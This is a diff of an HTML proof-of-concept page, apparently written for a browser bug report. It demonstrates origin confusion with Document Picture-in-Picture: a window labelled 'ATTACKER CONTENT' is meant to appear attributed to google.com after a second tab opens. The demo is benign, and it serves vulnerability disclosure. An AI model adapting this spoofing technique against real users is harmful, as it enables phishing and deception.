@@ -1,32 +1,44 @@
 <!doctype html>
-<html><meta charset=utf-8>
+<html>
+<head><meta charset="utf-8"><title>Document PiP Clickable - Red Proof</title></head>
 <body>
-<h3>Document PiP - Origin Confusion - Desktop - NOT dup of 565928741</h3>
-<p>1 click = PiP (requires gesture per spec). 2 = open google.com new tab (normal browsing)</p>
-<button id=a>1. Open PiP (attacker.com)</button>
-<button id=b>2. Open google.com in new tab</button>
+<h3>Document PiP - Origin Confusion - Desktop</h3>
+<button id="a">1. Open PiP (attacker.com)</button>
+<button id="b">2. Open google.com in new tab</button>
 <script>
-let w;
-document.getElementById('a').onclick=async()=>{
- w=await documentPictureInPicture.requestWindow({width:400,height:250});
- w.document.body.innerHTML=`
- <style>
- body{font-family:sans-serif;padding:20px}
- #x{padding:12px 18px;font-size:16px;cursor:pointer}
- </style>
- <h3>ATTACKER CONTENT</h3>
- <p>From bonex1927.github.io</p>
- <button id=x>Click me</button>
- <script>
- document.getElementById('x').onclick=()=>{
-  let btn=document.getElementById('x');
-  btn.textContent='Clicked! From attacker.com but bar=google.com';
-  btn.style.background='red';
-  btn.style.color='white';
-  btn.style.border='2px solid darkred';
- }
- <\/script>`;
+let pipWin;
+document.getElementById('a').onclick = async () => {
+  pipWin = await documentPictureInPicture.requestWindow({width: 400, height: 260});
+  
+  // style
+  pipWin.document.body.style.fontFamily = 'sans-serif';
+  pipWin.document.body.style.padding = '20px';
+  
+  const title = pipWin.document.createElement('h3');
+  title.textContent = 'ATTACKER CONTENT';
+  pipWin.document.body.appendChild(title);
+  
+  const p = pipWin.document.createElement('p');
+  p.textContent = 'From bonex1927.github.io';
+  pipWin.document.body.appendChild(p);
+  
+  const btn = pipWin.document.createElement('button');
+  btn.textContent = 'Click me';
+  btn.style.padding = '12px 18px';
+  btn.style.fontSize = '16px';
+  btn.style.cursor = 'pointer';
+  btn.onclick = () => {
+    btn.textContent = 'Clicked! From attacker.com but bar=google.com';
+    btn.style.background = 'red';
+    btn.style.color = 'white';
+    btn.style.border = '2px solid darkred';
+  };
+  pipWin.document.body.appendChild(btn);
 };
-document.getElementById('b').onclick=()=>window.open('https://www.google.com','_blank');
+
+document.getElementById('b').onclick = () => {
+  window.open('https://www.google.com', '_blank');
+};
 </script>
-</body></html>
+</body>
+</html>
